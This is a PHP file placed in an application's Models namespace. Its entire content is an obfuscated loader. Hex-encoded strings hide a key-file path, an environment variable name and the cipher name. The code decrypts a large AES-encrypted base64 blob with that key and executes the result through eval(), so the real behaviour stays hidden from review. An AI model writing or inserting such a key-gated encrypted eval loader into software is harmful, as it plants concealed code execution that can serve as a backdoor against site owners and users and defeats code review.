<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('IbvBjoWjIscwdSHqi42h4w==');

$c=base64_decode(

'nkd5Nx78APXTrCgU4rrFdx4d4PxrqHxxz0N2fZpej7+4gejo0WRWUIYjQ0vE3uCNI2xSrUQT2lOn' .
'wTWVXkFcKA0Wd3LcdEwvy2JhldDZOlxvCSN3VUx60igt0lIQzK2wpd59RftKNPmdqKKiClhgCfx1' .
'cXge1gwRqEdkrvOANAXvsvzH1ab/8hRkuQi6O+WIWfB8AEkmQbwTRHBjaJvjvylp3ytXyt00Y+C7' .
'JT+zE74OAKpw3vjLNpnjMTBdlnYT5nkyY3IPIW50IAWArasnbXRWem7LsOn5m0z7XeoeNVQKegxZ' .
'4G6KTQtlLiq2HwTA4rbufjwsO+bVEprN2iTB5a2gEmnZmSaxoObjpSHnghfk8ANXuLLlD/qaduVu' .
'65+s5hyWkQEVhDV6CZ6FXfhqzjXUESSr3fwu13gW1NQdJnw5idIOR9lw3Ej8+Aa1C8ZCsYqrAiio' .
'NrPhef93vTLO5pz/vZzJWvLnfF7yclO1OHvOpXCEHEoFYUoSWSW5JT4XbZimSGdW2cYbYKQCrKFy' .
'o/8l1QG0B9sE/Ze4Tg2bl1IRgXcyTiX5rQRttx+Fxzp6ShQADAYul/m3Y5Ir6ALJboO5YwLoW/q9' .
'lwulTAAZaNo1U3jIKrD4duXLO65WS40ov9WArFqE6VuxMEuVtNgzyIbrPVKIJ04GQVKZdQLVsgvv' .
'yhWc4QV62a2pDq0AnrImIjDYjHVxp6AgYtqXx2gz1ZkSd1masRTcu6/PlhxFAx6cWpxRAsWi2CLK' .
'ITJrYJFnG+5+CfOB6ab3txHPOVVoLf0oJBRNAL6YqP9EVbNxgGF1RBbWq/s7SqwflZxLDg2HhJDt' .
'X3ODrKf3LkISfxv6wyXHM933mPFHy8wZhhQjqSDmKIQnfKm/z0YEJFkAew5rtZ4sH92LZupueXmL' .
'Aj8htvQq6updPNJIp4b1qQKPNGTL0agrmA9cNbf2cpn2SkSMSXcYbdNJoEQeGSpo4wsjpQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

